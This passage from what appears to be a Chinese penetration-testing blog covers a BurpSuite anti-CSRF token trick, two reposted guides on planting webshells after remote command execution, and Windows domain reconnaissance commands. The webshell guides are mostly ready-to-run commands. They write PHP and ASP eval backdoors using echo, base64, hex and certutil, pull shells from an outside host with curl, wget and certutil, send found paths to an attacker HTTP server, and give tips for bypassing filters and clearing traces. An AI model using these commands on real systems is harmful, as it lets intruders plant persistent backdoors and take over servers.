<p>看过这两个请求包应该就明白了这次token是在请求头中而定义宏的时候会让你选择更新token的地方这个地方却没有更新请求头的功能所以姿势2在这里就失效了<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686281.png" alt="图片"></p>
<p>首先定义宏获取token这个宏只需要要确保在请求2之前会执行请求1相比于姿势2的步骤简单一点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686282.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686283.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686284.png" alt="图片"></p>
<p>到这里宏就配置好了在repeater重放请求2然后再logger+&#x3D;里面查看确保每次都会在请求2前自动执行请求1就是正常的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686285.png" alt="图片"></p>
<p>然后配置插件Extractor把两个请求包都发送到Extractor</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686386.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686387.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686388.png" alt="图片"></p>
<p>此时回到repeater模块重放发现token就有效了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686389.png" alt="图片"></p>
<p>再次回到logger++看发生了什么看到第87个请求获取的token值为407667d008b147199d174681a655aea0</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686390.png" alt="图片"></p>
<p>第88个请求包的accessToken值也是407667d008b147199d174681a655aea0</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%8F%8DCSRF%E7%88%86%E7%A0%B4%E7%9A%84%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF/640-166418400686391.png" alt="图片"></p>
<p>总结一下姿势3的思路宏负责在请求2前发送请求1Extractor插件负责匹配和替换token</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行之文件落地利用总结</title>
    <url>/posts/62d254d8.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：命令执行无回显、不出网的解决方案，干货！</p>
<p>转载自: <a href="https://mp.weixin.qq.com/s/wi1fx4riMuJMjRX284m0Mg">https://mp.weixin.qq.com/s/wi1fx4riMuJMjRX284m0Mg</a></p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a><strong>0x01 前言</strong></h2><p>利用各类RCE远程命令执行或MSSQL注入等漏洞获取到一个能够执行命令的权限后该如何写入Webshell？这里我们根据可能会遇到的多个场景进行了一些测试，如：Linux&#x2F;Windows，出&#x2F;不出网、有&#x2F;无回显。</p>
<p>一般我们在确定能够执行命令时都会选择直接上线CS&#x2F;MSF，但也会遇到那种不出网、无回显的场景，这时可能就需要找到目标网站的绝对路径先写入一个Webshell，然后再进行后续的信息搜集及内网渗透等。</p>
<p><strong>注：</strong>我们可以通过在网站前&#x2F;后台的上传功能随便传一个文件，然后再利用Windows的for或Linux的while等命令来查找刚上传的文件，或网站下已存在的文件得到绝对路径，最后再写入文件即可，继续往下看。</p>
<h3 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02 Linux"></a><strong>0x02 Linux</strong></h3><h4 id="1-目标出网，命令有回显"><a href="#1-目标出网，命令有回显" class="headerlink" title="(1) 目标出网，命令有回显"></a>(1) 目标出网，命令有回显</h4><p>如果目标主机可以出网，并且执行命令有回显，这时我们就可以直接通过执行以下命令来获取目标网站的绝对路径，然后再利用以下多种方式写入或下载Webshell。</p>
<p><strong>查找绝对路径：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate 1653042293000.png 2&gt;/dev/null</span><br><span class="line">find / -name 1653042293000.png 2&gt;/dev/null</span><br><span class="line">find / | grep 1653042293000.png 2&gt;/dev/null</span><br><span class="line">find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;某某网站&quot;</span><br></pre></td></tr></table></figure>



<p><strong>常规方式写入：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>



<p><strong>远程下载写入：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.1.120/shell.txt &gt; /var/www/html/shell.php</span><br><span class="line">wget http://192.168.1.120/shell.txt -O /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/640.png" alt="图片"></p>
<h4 id="2-目标出网，命令无回显"><a href="#2-目标出网，命令无回显" class="headerlink" title="(2) 目标出网，命令无回显"></a>(2) 目标出网，命令无回显</h4><p>如果目标主机可以出网，但执行命令无回显，这时我们可以通过执行以下命令使用httplog方式来获取目标网站的绝对路径，然后再利用以下方式写入Webshell，需转义或有防护时可尝试编码方式写入。</p>
<p><strong>查找绝对路径：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br><span class="line">curl http://192.168.1.120:8888/`find / | grep 1653042293000.png`</span><br><span class="line">wget http://192.168.1.120:8888/`find / | grep 1653042293000.png`</span><br></pre></td></tr></table></figure>



<p><strong>编码方式写入：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ | base64 -d &gt; /var/www/html/shell.php</span><br><span class="line">echo 3C3F706870206576616C28245F504F53545B315D293B3F3E | xxd -r -ps &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/640-16539638778651.png" alt="图片"></p>
<h4 id="3-目标不出网，命令无回显"><a href="#3-目标不出网，命令无回显" class="headerlink" title="(3) 目标不出网，命令无回显"></a><strong>(3) 目标不出网，命令无回显</strong></h4><p>如果目标主机不能出网，并且执行命令无回显，这时我们可以通过执行以下命令先遍历出1653042293000.png文件的绝对路径，然后再次遍历该文件绝对路径，或者将Webshell写入到该文件同级目录下。</p>
<p>实战应用中最好是先确定目标网站的绝对路径，然后单独写入Webshell，最好不要直接使用第二条命令，因为如果目标主机上有同名文件时则会往找到的多个绝对路径下写入文件，到时还要注意清理痕迹。</p>
<p><strong>查找绝对路径写入至web目录：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name 1653042293000.png | while read f;do sh -c &#x27;find / -name 1653042293000.png&#x27; &gt;$(dirname $f)/path.txt;done</span><br></pre></td></tr></table></figure>



<p><strong>查找绝对路径写入Webshell：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name 1653042293000.png | while read f;do sh -c &quot;echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ | base64 -d&quot;&gt;$(dirname $f)/shell.php;done</span><br><span class="line">find / -name 1653042293000.png | while read f;do sh -c &quot;echo 3C3F706870206576616C28245F504F53545B315D293B3F3E | xxd -r -ps&quot;&gt;$(dirname $f)/shell.php;done</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<h3 id="0x03-Windows"><a href="#0x03-Windows" class="headerlink" title="0x03 Windows"></a><strong>0x03 Windows</strong></h3><h4 id="1-目标出网，命令有回显-1"><a href="#1-目标出网，命令有回显-1" class="headerlink" title="(1) 目标出网，命令有回显"></a><strong>(1) 目标出网，命令有回显</strong></h4><p>如果目标主机可以出网，并且执行命令有回显，这时我们可以通过执行dir、where、for、finstr等命令，或读取IIS配置文件等方式来获取目标网站的绝对路径，然后再利用以下多种方式写入或下载Webshell。</p>
<p><strong>查找绝对路径：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a/b/s C:\1653042293000.png</span><br><span class="line">where /r C:\1653042293000.png</span><br><span class="line">for /r &quot;C:\&quot; %i in (1653042293000.png*) do @echo %i</span><br><span class="line">findstr /n /s /i &quot;某某网站&quot; C:\*.asp</span><br><span class="line">%windir%\system32\inetsrv\appcmd list VDIR</span><br></pre></td></tr></table></figure>



<p><strong>常规方式写入：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set /p=&quot;&lt;%execute request(&quot;1&quot;)%&gt;&quot; &lt;nul &gt;&gt; C:\inetpub\wwwroot\shell.asp</span><br><span class="line">echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt; C:\inetpub\wwwroot\shell.asp</span><br><span class="line">certutil -urlcache -split -f http://192.168.1.105:8080/shell.txt C:\inetpub\wwwroot\shell.asp</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/640-16539638778662.png" alt="图片"></p>
<h4 id="2-目标出网，命令无回显-1"><a href="#2-目标出网，命令无回显-1" class="headerlink" title="(2) 目标出网，命令无回显"></a><strong>(2) 目标出网，命令无回显</strong></h4><p>如果目标主机可以出网，但执行命令无回显，这时我们可以通过执行以下命令在指定的C盘中循环查找1653042293000.png文件，将找到的文件绝对路径保存在%i变量，然后执行certutil通过httplog方式来获取目标网站的绝对路径，或者直接写入Webshell，需转义或有防护时可尝试编码方式写入，需清理shell.txt。</p>
<p><strong>查找绝对路径：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br><span class="line">for /r C:\ %i in (1653042293000.png*) do certutil -urlcache -split -f http://192.168.1.120:8888/%i</span><br></pre></td></tr></table></figure>



<p><strong>常规方式写入：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r C:\ %i in (1653042293000.png*) do echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt; %i/../shell.asp</span><br></pre></td></tr></table></figure>



<p><strong>编码方式写入：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r C:\ %i in (1653042293000.png*) do echo PCVleGVjdXRlIHJlcXVlc3QoIjEiKSU+ &gt; %i/../shell.txt &amp; certutil -decode %i/../shell.txt %i/../shell.asp</span><br><span class="line">for /r C:\ %i in (1653042293000.png*) do echo 3C256578656375746520726571756573742822312229253E &gt; %i/../shell.txt &amp; certutil -decodehex %i/../shell.txt %i/../shell.asp</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/640-16539638778663.png" alt="图片"></p>
<h4 id="3-目标不出网，命令无回显-1"><a href="#3-目标不出网，命令无回显-1" class="headerlink" title="(3) 目标不出网，命令无回显"></a><strong>(3) 目标不出网，命令无回显</strong></h4><p>如果目标主机不能出网，并且执行命令无回显，这时我们可以通过执行以下命令将找到的1653042293000.png文件绝对路径，或者将Webshell写入到该文件同级目录下，需转义或有防护时可尝试编码方式写入。</p>
<p>两条命令虽然看起来差不多，但第一条执行效率要高一些，因为在命令执行过程中就已经写入了，第二条得在命令执行完成后才会写入，所以个人推荐使用第一种，注意清理同名文件路径下的痕迹。</p>
<p><strong>查找绝对路径写入至web目录：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r C:\ %i in (1653042293000.png*) do echo %i&gt; %i\..\path.txt</span><br><span class="line">for /f %i in (&#x27;dir /s /b C:\1653042293000.png&#x27;) do echo %i&gt; %i\..\path.txt</span><br><span class="line">forfiles /P C:\ /S /M 1653042293000.png /C &quot;cmd /c dir /a/b/s C:\1653042293000.png &gt; path.txt&quot;</span><br></pre></td></tr></table></figure>



<p><strong>查找绝对路径写入Webshell：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r C:\ %i in (1653042293000.png*) do echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt; %i/../shell.asp</span><br><span class="line">for /f %i in (&#x27;dir /s /b C:\1653042293000.png&#x27;) do echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt; %i/../shell.asp</span><br><span class="line">forfiles /P C:\ /S /M 1653042293000.png /C &quot;cmd /c echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt; shell.asp&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/640-16539638778664.png" alt="图片"></p>
<h3 id="文末总结："><a href="#文末总结：" class="headerlink" title="文末总结："></a><strong>文末总结：</strong></h3><p>这篇文章我将找绝对路径方式分为3种：命令查找（有回显）、httplog外带（无回显）、写进Web目录（不出网），写文件方式也分为3种：常规写入、编码写入、远程下载。Linux、Windows利用方式都一样，只是命令不一样，都是根据文件名、文件内容找绝对路径，常见文件写入、下载方式进行Getshell。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行写Webshell总结</title>
    <url>/posts/a097f57d.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://zhuanlan.zhihu.com/p/503233032">https://zhuanlan.zhihu.com/p/503233032</a></p>
<p>补充一些自己的总结</p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>当我们找到一个rce漏洞却无法反弹shell时，在web路径写webshell用连接工具进行管理会方便的多，本文总结从命令执行到webshell的流程化操作。</p>
<h2 id="寻找web路径"><a href="#寻找web路径" class="headerlink" title="寻找web路径"></a><strong>寻找web路径</strong></h2><p>写webshell当然要写在web路径，第一步要做的就是快速寻找web路径。</p>
<p><strong>1.文件查找法</strong></p>
<p>一般web路径一定会有index.html\php\jsp\asp，<a href="https://link.zhihu.com/?target=http://login.xxx">http://login.xxx</a>文件。可以根据已知页面文件名全局搜索。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">linux:</span><br><span class="line">find / -name index.php</span><br><span class="line">find / -name index.*</span><br><span class="line">windows:</span><br><span class="line">for /r d:/ %i in (index.html) do @echo %i</span><br><span class="line">for /r d:/ %i in (index.*) do @echo %i</span><br></pre></td></tr></table></figure>

<p><strong>2.源码查找法</strong></p>
<p>也可以选择打开当前已知web页面的f12查看源码，寻找一段特征足够明显的源码进行查找。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">linux:</span><br><span class="line">find / -name &quot;*.*&quot; | xargs grep &quot;PHP installed properly&quot;</span><br><span class="line">find /var/www/ -name &quot;*.php&quot; | xargs grep &quot;doServerTest()&quot;</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">findstr /s/i/n /d:D:\sec_tools\ /c:&quot;html&quot; *.html</span><br><span class="line">findstr /s/i/n /d:C:\windows\ /c:&quot;success&quot; *.*</span><br></pre></td></tr></table></figure>

<p><strong>3.history等</strong></p>
<p>通过linux历史命令查找web相关的服务启动命令。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">history | grep nginx</span><br><span class="line">history | grep tomcat</span><br><span class="line">history | grep http</span><br></pre></td></tr></table></figure>

<h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a><strong>写入webshell</strong></h2><p>确认寻找到的路径有写入权限之后，就可以开始写webshell了。</p>
<p><strong>1.echo直接写入</strong></p>
<p><strong>Linux</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27; &gt; 1.php</span><br></pre></td></tr></table></figure>

<p><strong>Windows</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[1]);?^&gt;&gt; ./WWW/shell.php</span><br></pre></td></tr></table></figure>

<p>直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽。</p>
<p><strong>2.base64写入</strong></p>
<p><strong>Linux</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot; | base64 -d &gt;2.php</span><br></pre></td></tr></table></figure>

<p><strong>Windows</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;&gt;2.php &amp;&amp; certutil -decode 2.php shell.php</span><br></pre></td></tr></table></figure>

<p>使用base64是比较通用的方法，完美去除了webshell本身的特殊字符。</p>
<p><strong>3.绕过重定向符</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">echo &quot;ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=&quot; | base64 -d | bash</span><br><span class="line">echo &quot;ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=&quot; | base64 -d | sh</span><br></pre></td></tr></table></figure>

<p>重定向符&gt;不可用时，我们可以将1或2中的整体命令base64编码，然后解码后通过bash或sh执行。</p>
<p>其他字符绕过方式，如空格对应${IFS}等，可参考命令注入的绕过方式 <a href="https://link.zhihu.com/?target=http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a>。</p>
<p><strong>4.远端下载webshell</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">远端服务器放置webshell,开启http</span><br><span class="line">python -m http.server</span><br><span class="line"></span><br><span class="line">目标机器执行</span><br><span class="line">wget http://xx.xx.xxx.xx:8000/xxx.php</span><br></pre></td></tr></table></figure>

<p>可出网且有wget的情况下可采用此方式。</p>
<p><strong>5.hex写入</strong></p>
<p>hex写入与base64写入相似，在 <a href="https://link.zhihu.com/?target=https://www.107000.com/T-Hex/">https://www.107000.com/T-Hex/</a> 将webshell编码成hex，使用xxd命令还原。</p>
<p>或在使用前将webshell使用xxd生成hex数据。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27; |xxd -ps</span><br></pre></td></tr></table></figure>

<p>然后命令注入执行。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps &gt; 5</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WebShell</tag>
      </tags>
  </entry>
  <entry>
    <title>域内信息收集命令</title>
    <url>/posts/9663dae0.html</url>
    <content><![CDATA[<h3 id="域内信息收集命令汇总"><a href="#域内信息收集命令汇总" class="headerlink" title="域内信息收集命令汇总"></a>域内信息收集命令汇总</h3><h4 id="1-判断是否存在域"><a href="#1-判断是否存在域" class="headerlink" title="1. 判断是否存在域"></a>1. 判断是否存在域</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419223138293.png" alt="image-20210419223138293"></p>
<p>如果显示workgroup则可能是不在域内</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419223518170.png" alt="image-20210419223518170"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net time /domain           //有三种情况</span><br></pre></td></tr></table></figure>

<p>1）存在域并且是当用户是域用户</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419223544770.png" alt="image-20210419223544770"></p>
<p>2）存在域，当前用户不是域用户</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419223717737.png" alt="image-20210419223717737"></p>
<p>3）不存在域</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419223735608.png" alt="image-20210419223735608"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation   查看当前登录域</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419223905163.png" alt="image-20210419223905163"></p>
<h4 id="2-域内存活主机探测"><a href="#2-域内存活主机探测" class="headerlink" title="2. 域内存活主机探测"></a>2. 域内存活主机探测</h4><p>&#x3D;&#x3D;利用netbios探测主机存活&#x3D;&#x3D;</p>
<p>工具：nbtscan</p>
<p>&#x3D;&#x3D;利用icmp协议探测内网&#x3D;&#x3D;</p>
<p>ping 命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419225354903.png" alt="image-20210419225354903"></p>
<p>&#x3D;&#x3D;利用arp扫描探测内网&#x3D;&#x3D;</p>
<p>工具：arp-scan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t 192.168.52.0/24</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419225639280.png" alt="image-20210419225639280"></p>
<h4 id="3-域内端口扫描"><a href="#3-域内端口扫描" class="headerlink" title="3. 域内端口扫描"></a>3. 域内端口扫描</h4><p>&#x3D;&#x3D;telnet命令扫描&#x3D;&#x3D;</p>
<p>工具：s扫描器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s.exe TCP 192.168.52.1 192.168.52.254 端口号 /Banner /save</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;metasploit端口扫描模块&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>

<h4 id="4-查找域控制器"><a href="#4-查找域控制器" class="headerlink" title="4. 查找域控制器"></a>4. 查找域控制器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /DCLIST:域的名称</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/image-20210419230045616.png" alt="image-20210419230045616"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure>

